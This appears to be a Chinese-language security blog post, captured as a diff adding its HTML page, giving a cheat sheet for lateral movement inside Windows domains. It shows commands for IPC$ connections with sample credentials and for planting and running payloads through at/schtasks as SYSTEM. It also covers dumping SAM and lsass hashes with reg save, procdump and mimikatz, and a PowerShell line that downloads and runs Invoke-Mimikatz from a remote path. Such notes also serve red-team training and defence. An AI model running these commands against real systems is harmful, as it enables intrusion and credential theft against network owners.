@@ -1,0 +1,472 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="pragma" content="no-cache">
+  <meta http-equiv="cache-control" content="no-cache">
+  <meta http-equiv="expires" content="0">
+  
+  <title>域内横向（一） | Zoukba&#39;s gun</title>
+  <meta name="author" content="zoukba">
+  
+  <meta name="description" content="域内横向（一）Windos常用远程连接与命令IPC
+与目标机器建立ipc$连接
+  1net use \\192.168.1.12\ipc$ &amp;quot;asd123qwe&amp;quot; /user:administrator
+在被控主机查看建立的连接
+  1net use
+删除ipc$连接
+  1net use \\192.168.1.12\ipc$ /del /y
+ipc$利用条件
+
+ipc$需要开启139,445端口
+管理员开启默认共享（对于逻辑盘的默认访问）
+
+
+ipc$常见错误号
+
+5：拒绝访问
+51：Windows主机无法找到网络路径，中存在问题
+53：找不到网络路径，ip地址错误、目标未开机、目标的lanmanserver服务未启动、目标存在防火墙
+67：找不到网络名、lanmanserver服务未启动、ipc$已被删除
+1219：提供的凭据与已存在的凭据集冲突，请查看是否已经连接ipc$
+1326: 未知的用户名或密码错误
+1792：网络登录服务未启动、NetLogon服务未启动
+2242：用户密码已过期Windows自带工具获取远程主机信息（建立ipc$之后）
+
+
+dir
+  1dir \\192.168.1.10\c$       #列出远程主机c盘下的文档
+tasklist
+  1tasklist /S 192.168.1.10 /U Administrator /P asdqwe1123     #列出远程主机上的进程
+计划任务
+at命令
+
+查看目标系统时间 1net time \\192.168.1.10
+将后门、payload…复制到目标系统中 1copy cale.bat \\192.168.1.10\C$
+使用at创建计划任务 1at \\192.168.1.10 5:00PM C:\cale.bat 
+清除at记录 1at \\192.168.1.10 7 /delete         #7为任务ID
+将执行结果写在本地 1at \\192.168.1.10 5:00AM cmd.exe /c &amp;quot;ipconfig &amp;gt;C:1.txt&amp;quot;
+使用type读取远程主机文件 1type \\192.168.1.10\C$\1.txt
+
+
+schtasks命令（由于在windows2008、Vista之后at命令被废弃，使用schtasks顶替）
+
+创建计划任务  1schtasks /create /s 192.168.1.10 /tn test /sc onstart /tr c:\calc.bat /ru system /f     #在主机上创建一个名为test的任务，在下次开机的时候已system的权限运行C盘下的calc.bat文件```
+运行主机中的计划任务  1schtasks /run /s 192.168.1.10 /i /tn &amp;quot;test&amp;quot;
+如ipc$没有连接  123/u administrator    #用户账号/p &amp;quot;123asdqwe&amp;quot;      #用户密码/f                  #强制解除
+删除计划任务  1schtasks /delete /s 192.168.1.10 /tn &amp;quot;test&amp;quot; /f
+日志存储在C:\Windows\Tasks\SchedLgU.txt中
+
+
+
+Windows系统散列值获取LM Hash和NTLM Hash
+Windows操作系统中的密码由LM Hash和NTLM Hash组成
+  1username:RID:LM-Hash:NTLM-Hash
+
+LM Hash: 其本质为DES加密，Windows在版本Vista和2008之后就将其禁用。如在抓取之后LM-Hash值出现aad3b435b51404eeaad3b435b51404ee就表示LM-Hash被禁用
+
+NTLM Hash: 其本质基于MD4加密算法进行加密个人版Vista和服务器版2003之后，Windows操作系统的认证方式采用NTLM Hash
+
+
+单机密码抓取
+在Windows操作系统中抓取散列值或者明文密码，其权限必须为System，其本地用户的密码及其散列值都保存在SAM文件中。lsass.exe进程用于实现Windows的安全策略（本地安全策略和登录策略）。如此看来我们就可以使用工具在进程lsass.exe文件和SAM文件中导出密码和散列值。
+
+读取SAM文件"> 
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  <meta property="og:title" content="域内横向（一）"/>
+  <meta property="og:site_name" content="Zoukba&#39;s gun"/>
+
+  
+    <meta property="og:image" content=""/>
+  
+
+  
+    <link rel="alternative" href="/[object Object]" title="Zoukba&#39;s gun" type="application/atom+xml">
+  
+  
+  
+  <link rel="stylesheet" href="/css/bootstrap.min.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/font-awesome.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/responsive.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/highlight.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/google-fonts.css" media="screen" type="text/css">
+  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+
+  <script src="/js/jquery-2.0.3.min.js"></script>
+
+  <!-- analytics -->
+  
+  <!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-70812759-1"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'UA-70812759-1');
+</script>
+
+
+
+
+
+
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+ <body>  
+  <nav id="main-nav" class="navbar navbar-inverse navbar-fixed-top" role="navigation">
+    <div class="container">
+      <button type="button" class="navbar-header navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
+		<span class="sr-only">Toggle navigation</span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button>
+	  <a class="navbar-brand" href="/">Zoukba&#39;s gun</a>
+      <div class="collapse navbar-collapse nav-menu">
+		<ul class="nav navbar-nav">
+		  
+		  <li>
+			<a href="/archives" title="All the articles.">
+			  <i class="fa fa-archive"></i>Archives
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/categories" title="All the categories.">
+			  <i class="fa fa-folder"></i>Categories
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/tags" title="All the tags.">
+			  <i class="fa fa-tags"></i>Tags
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/about" title="About me.">
+			  <i class="fa fa-user"></i>About
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/atom.xml" title="Subscribe me.">
+			  <i class="fa fa-user"></i>RSS
+			</a>
+		  </li>
+		  
+		</ul>
+      </div>
+    </div> <!-- container -->
+</nav>
+<div class="clearfix"></div>
+
+  <div class="container">
+  	<div class="content">
+    	 
+
+
+	
+		<div class="page-header">
+			<h1> 域内横向（一）</h1>
+		</div>
+	
+
+
+
+<div class="row post">
+	<!-- cols -->
+	
+	<div id="top_meta"></div>
+	<div class="col-md-9">
+	
+
+	<!-- content -->
+	<div class="mypage">		
+	  		
+
+	  <h1 id="域内横向（一）"><a href="#域内横向（一）" class="headerlink" title="域内横向（一）"></a>域内横向（一）</h1><h2 id="Windos常用远程连接与命令"><a href="#Windos常用远程连接与命令" class="headerlink" title="Windos常用远程连接与命令"></a>Windos常用远程连接与命令</h2><h3 id="IPC"><a href="#IPC" class="headerlink" title="IPC"></a>IPC</h3><ul>
+<li><p>与目标机器建立ipc$连接</p>
+  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net use \\192.168.1.12\ipc$ <span class="string">&quot;asd123qwe&quot;</span> /user:administrator</span><br></pre></td></tr></table></figure></li>
+<li><p>在被控主机查看建立的连接</p>
+  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net use</span><br></pre></td></tr></table></figure></li>
+<li><p>删除ipc$连接</p>
+  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net use \\192.168.1.12\ipc$ /del /y</span><br></pre></td></tr></table></figure></li>
+<li><p>ipc$利用条件</p>
+<ol>
+<li>ipc$需要开启139,445端口</li>
+<li>管理员开启默认共享（对于逻辑盘的默认访问）</li>
+</ol>
+</li>
+<li><p>ipc$常见错误号</p>
+<ol>
+<li>5：拒绝访问</li>
+<li>51：Windows主机无法找到网络路径，中存在问题</li>
+<li>53：找不到网络路径，ip地址错误、目标未开机、目标的lanmanserver服务未启动、目标存在防火墙</li>
+<li>67：找不到网络名、lanmanserver服务未启动、ipc$已被删除</li>
+<li>1219：提供的凭据与已存在的凭据集冲突，请查看是否已经连接ipc$</li>
+<li>1326: 未知的用户名或密码错误</li>
+<li>1792：网络登录服务未启动、NetLogon服务未启动</li>
+<li>2242：用户密码已过期<h3 id="Windows自带工具获取远程主机信息（建立ipc-之后）"><a href="#Windows自带工具获取远程主机信息（建立ipc-之后）" class="headerlink" title="Windows自带工具获取远程主机信息（建立ipc$之后）"></a>Windows自带工具获取远程主机信息（建立ipc$之后）</h3></li>
+</ol>
+</li>
+<li><p>dir</p>
+  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dir \\192.168.1.10\c$       <span class="comment">#列出远程主机c盘下的文档</span></span><br></pre></td></tr></table></figure></li>
+<li><p>tasklist</p>
+  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tasklist /S 192.168.1.10 /U Administrator /P asdqwe1123     <span class="comment">#列出远程主机上的进程</span></span><br></pre></td></tr></table></figure>
+<h3 id="计划任务"><a href="#计划任务" class="headerlink" title="计划任务"></a>计划任务</h3></li>
+<li><p>at命令</p>
+<ol>
+<li>查看目标系统时间 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net time \\192.168.1.10</span><br></pre></td></tr></table></figure></li>
+<li>将后门、payload…复制到目标系统中 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy cale.bat \\192.168.1.10\C$</span><br></pre></td></tr></table></figure></li>
+<li>使用at创建计划任务 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">at \\192.168.1.10 5:00PM C:\cale.bat </span><br></pre></td></tr></table></figure></li>
+<li>清除at记录 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">at \\192.168.1.10 7 /delete         <span class="comment">#7为任务ID</span></span><br></pre></td></tr></table></figure></li>
+<li>将执行结果写在本地 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">at \\192.168.1.10 5:00AM cmd.exe /c <span class="string">&quot;ipconfig &gt;C:1.txt&quot;</span></span><br></pre></td></tr></table></figure></li>
+<li>使用type读取远程主机文件 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">type</span> \\192.168.1.10\C$\1.txt</span><br></pre></td></tr></table></figure></li>
+</ol>
+</li>
+<li><p>schtasks命令（由于在windows2008、Vista之后at命令被废弃，使用schtasks顶替）</p>
+<ul>
+<li>创建计划任务  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">schtasks /create /s 192.168.1.10 /tn <span class="built_in">test</span> /sc onstart /tr c:\calc.bat /ru system /f     <span class="comment">#在主机上创建一个名为test的任务，在下次开机的时候已system的权限运行C盘下的calc.bat文件```</span></span><br></pre></td></tr></table></figure></li>
+<li>运行主机中的计划任务  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">schtasks /run /s 192.168.1.10 /i /tn <span class="string">&quot;test&quot;</span></span><br></pre></td></tr></table></figure></li>
+<li>如ipc$没有连接  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/u administrator    <span class="comment">#用户账号</span></span><br><span class="line">/p <span class="string">&quot;123asdqwe&quot;</span>      <span class="comment">#用户密码</span></span><br><span class="line">/f                  <span class="comment">#强制解除</span></span><br></pre></td></tr></table></figure></li>
+<li>删除计划任务  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">schtasks /delete /s 192.168.1.10 /tn <span class="string">&quot;test&quot;</span> /f</span><br></pre></td></tr></table></figure></li>
+<li>日志存储在<code>C:\Windows\Tasks\SchedLgU.txt</code>中</li>
+</ul>
+</li>
+</ul>
+<h2 id="Windows系统散列值获取"><a href="#Windows系统散列值获取" class="headerlink" title="Windows系统散列值获取"></a>Windows系统散列值获取</h2><h3 id="LM-Hash和NTLM-Hash"><a href="#LM-Hash和NTLM-Hash" class="headerlink" title="LM Hash和NTLM Hash"></a>LM Hash和NTLM Hash</h3><ul>
+<li><p>Windows操作系统中的密码由LM Hash和NTLM Hash组成</p>
+  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username:RID:LM-Hash:NTLM-Hash</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>LM Hash: 其本质为DES加密，Windows在版本Vista和2008之后就将其禁用。如在抓取之后LM-Hash值出现<code>aad3b435b51404eeaad3b435b51404ee</code>就表示LM-Hash被禁用</p>
+</li>
+<li><p>NTLM Hash: 其本质基于MD4加密算法进行加密个人版Vista和服务器版2003之后，Windows操作系统的认证方式采用NTLM Hash</p>
+</li>
+</ul>
+<h3 id="单机密码抓取"><a href="#单机密码抓取" class="headerlink" title="单机密码抓取"></a>单机密码抓取</h3><ul>
+<li>在Windows操作系统中抓取散列值或者明文密码，其权限必须为System，其本地用户的密码及其散列值都保存在SAM文件中。lsass.exe进程用于实现Windows的安全策略（本地安全策略和登录策略）。如此看来我们就可以使用工具在进程lsass.exe文件和SAM文件中导出密码和散列值。</li>
+</ul>
+<h4 id="读取SAM文件"><a href="#读取SAM文件" class="headerlink" title="读取SAM文件"></a>读取SAM文件</h4><ul>
+<li><p>GetPass、PwDump7</p>
+</li>
+<li><p>通过SAM和System文件抓取密码</p>
+<ol>
+<li><p>导出SAM和System文件</p>
+ <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#无工具导出</span></span><br><span class="line">reg save hklm\sam sam.hive</span><br><span class="line">reg save hklm\system system.hive</span><br></pre></td></tr></table></figure></li>
+<li><p>通过读取SAM和System文件获得NTLM-Hash</p>
+<ul>
+<li><p>使用mimikatz读取SAM和System文件</p>
+  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lsadump::sam /sam:sam.hive /system:system.hive</span><br></pre></td></tr></table></figure></li>
+<li><p>使用mimikatz直接读取本地SAM文件，导出Hash信息</p>
+  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#需将mimikatz上传到目标机</span></span><br><span class="line">mimikatz.exe <span class="string">&quot;privilege::debug&quot;</span> <span class="string">&quot;log&quot;</span> <span class="string">&quot;sekurlsa::logonpasswords&quot;</span>        <span class="comment">#privilege::debug&amp;token::elevate提升权限</span></span><br></pre></td></tr></table></figure></li>
+</ul>
+</li>
+</ol>
+</li>
+</ul>
+<h4 id="dump-lsass文件后读取"><a href="#dump-lsass文件后读取" class="headerlink" title="dump lsass文件后读取"></a>dump lsass文件后读取</h4><ol>
+<li><p>导出lsass.dump文件</p>
+<ul>
+<li><p>使用Procdump导出lsass.dmp文件</p>
+  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Procdump.exe -accepteula -ma lsass.exe lsass.dmp</span><br></pre></td></tr></table></figure></li>
+</ul>
+</li>
+<li><p>使用mimikatz导出lsass.dump文件中的密码散列值</p>
+<ul>
+<li>命令环境中运行mimikatz  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sekurlsa::minidump lsass.DMP        <span class="comment">#加载文件至mimikatz</span></span><br><span class="line">sekurlsa::logonPasswords full       <span class="comment">#导出散列值</span></span><br></pre></td></tr></table></figure></li>
+</ul>
+</li>
+</ol>
+<ul>
+<li>使用PowerShell对散列值进行Dump操作<ul>
+<li>使用Nishang  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Import-Module .\Get-PassHashes.ps1</span><br></pre></td></tr></table></figure></li>
+</ul>
+</li>
+<li>使用PowerShell远程加载mimikatz抓取散列值和明文</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell IEX (New-Object Net.WebClient).DownloadString(<span class="string">&#x27;网站路径/Invoke-Mimikatz.ps1&#x27;</span>); Invoke-Mimikatz        </span><br></pre></td></tr></table></figure>
+
+
+	  <div class="article-footer-copyright">
+
+    本博客采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank">知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议(CC BY-NC-SA 4.0) 发布.</a>
+</div>
+
+	</div>
+
+	
+	<span id="/2021/04/16/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%EF%BC%88%E4%B8%80%EF%BC%89/" class="leancloud-visitors view" data-flag-title="域内横向（一）">
+		<em class="post-meta-item-text"> Page View </em> <i class="leancloud-visitors-count"></i>
+	</span>
+	
+	<div>
+  	<center>
+
+	<div class="pagination">
+
+    
+    
+    <a href="/2021/04/16/内网穿透/" type="button" class="btn btn-default"><i
+                class="fa fa-arrow-circle-o-left"></i> 上一页</a>
+    
+
+    <a href="/" type="button" class="btn btn-default"><i class="fa fa-home"></i>Home</a>
+    
+    <a type="button" class="btn btn-default disabled">下一页<i class="fa fa-arrow-circle-o-right"></i></a>
+    
+
+    
+</div>
+
+
+    </center>
+	</div>
+	
+	<!-- comment -->
+	<!--
+<section id="comment">
+    <h2 class="title">留言</h2>
+
+    
+</section>
+
+-->
+	
+		<section id="comments" class="comments">
+			<style>
+			.comments{margin:30px;padding:10px;background:rgb(0, 0, 0)}
+			@media screen and (max-width:800px){.comments{margin:auto;padding:10px;background:#000}}
+			</style>
+			<div id="vcomment" class="comment"></div>
+<script src='//unpkg.com/valine/dist/Valine.min.js'></script>
+<script src="https://cdnjs.loli.net/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
+<script>
+var valineConfig = {"enable":true,"appId":"xxx","appKey":"xxx","placeholder":"提交评论时留下邮箱收到回复后将自动通知","visitor":true,"avatar":"monsterid","requiredFields":["nick","mail"]}
+valineConfig.el='#vcomment';
+new Valine(valineConfig);
+    // new Valine({
+    //     el: '#vcomment',
+    //     appId: "",
+    //     appKey: "",
+    //     placeholder: "提交评论时留下邮箱收到回复后将自动通知",
+    //     avatar:"monsterid",
+    //     visitor: "true",
+    //     requiredFields: "nick,mail".split(','),
+    // });
+</script>
+
+		</section>
+	
+	</div> <!-- col-md-9/col-md-12 -->
+
+
+	
+	<div id="side_meta">
+		<div class="col-md-3" id="post_meta"> 
+
+	<!-- date -->
+	
+	<div class="meta-widget">
+	<i class="fa fa-clock-o"></i>
+	2021-04-16 
+	</div>
+	
+
+	<!-- categories -->
+    
+	<div class="meta-widget">
+	<a data-toggle="collapse" data-target="#categorys"><i class="fa fa-folder"></i></a>	
+    <ul id="categorys" class="tag_box list-unstyled collapse in">
+          
+  <li>
+    <li><a href="/categories/内网杂七杂八/">内网杂七杂八<span>4</span></a></li>
+  </li>
+
+    </ul>
+	</div>
+	
+
+	<!-- tags -->
+	
+	<div class="meta-widget">
+	<a data-toggle="collapse" data-target="#tags"><i class="fa fa-tags"></i></a>		  
+    <ul id="tags" class="tag_box list-unstyled collapse in">	  
+	    
+  <li><a href="/tags/域内横向/">域内横向<span>1</span></a></li>
+    </ul>
+	</div>
+		
+
+	<!-- toc -->
+	<div class="meta-widget">
+	
+	   <a data-toggle="collapse" data-target="#toc"><i class="fa fa-bars"></i></a>
+	   <div id="toc" class="toc collapse in">
+		   <span class="toc-title">Contents</span>
+			<ol class="toc-article"><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%EF%BC%88%E4%B8%80%EF%BC%89"><span class="toc-article-text">域内横向（一）</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#Windos%E5%B8%B8%E7%94%A8%E8%BF%9C%E7%A8%8B%E8%BF%9E%E6%8E%A5%E4%B8%8E%E5%91%BD%E4%BB%A4"><span class="toc-article-text">Windos常用远程连接与命令</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#IPC"><span class="toc-article-text">IPC</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#Windows%E8%87%AA%E5%B8%A6%E5%B7%A5%E5%85%B7%E8%8E%B7%E5%8F%96%E8%BF%9C%E7%A8%8B%E4%B8%BB%E6%9C%BA%E4%BF%A1%E6%81%AF%EF%BC%88%E5%BB%BA%E7%AB%8Bipc-%E4%B9%8B%E5%90%8E%EF%BC%89"><span class="toc-article-text">Windows自带工具获取远程主机信息（建立ipc$之后）</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1"><span class="toc-article-text">计划任务</span></a></li></ol></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#Windows%E7%B3%BB%E7%BB%9F%E6%95%A3%E5%88%97%E5%80%BC%E8%8E%B7%E5%8F%96"><span class="toc-article-text">Windows系统散列值获取</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#LM-Hash%E5%92%8CNTLM-Hash"><span class="toc-article-text">LM Hash和NTLM Hash</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E5%8D%95%E6%9C%BA%E5%AF%86%E7%A0%81%E6%8A%93%E5%8F%96"><span class="toc-article-text">单机密码抓取</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#%E8%AF%BB%E5%8F%96SAM%E6%96%87%E4%BB%B6"><span class="toc-article-text">读取SAM文件</span></a></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#dump-lsass%E6%96%87%E4%BB%B6%E5%90%8E%E8%AF%BB%E5%8F%96"><span class="toc-article-text">dump lsass文件后读取</span></a></li></ol></li></ol></li></ol></li></ol>
+		</div>
+	
+	</div>
+	
+    <hr>
+	
+</div><!-- col-md-3 -->
+
+		
+
+	</div>
+	
+		
+
+</div><!-- row -->
+
+<!--
+ -->
+
+
+
+	</div>
+  </div>
+  <div class="container-narrow">
+  <footer> <p>
+  
+  &copy; 2021 zoukba's Blog
+  
+      powered by <a href="http://hexo.io/" target="_blank">Hexo</a>.Theme <a href="https://github.com/Ares-X/hexo-theme-freemind.bithack" target="_blank">freemind.bithack</a>  
+</p>
+ </footer>
+</div> <!-- container-narrow -->
+  
+
+
+  
+<a id="gotop" href="#">   
+  <span>⬆︎TOP</span>
+</a>
+
+<script src="/js/jquery.imagesloaded.min.js"></script>
+<script src="/js/gallery.js"></script>
+<script src="/js/bootstrap.min.js"></script>
+<script src="/js/main.js"></script>
+<script src="/js/search.js"></script> 
+
+
+
+
+   <script type="text/javascript">      
+     var search_path = "search.xml";
+	 if (search_path.length == 0) {
+	 	search_path = "search.xml";
+	 }
+	 var path = "/" + search_path;
+     searchFunc(path, 'local-search-input', 'local-search-result');
+   </script>
+
+</body>
+   </html>
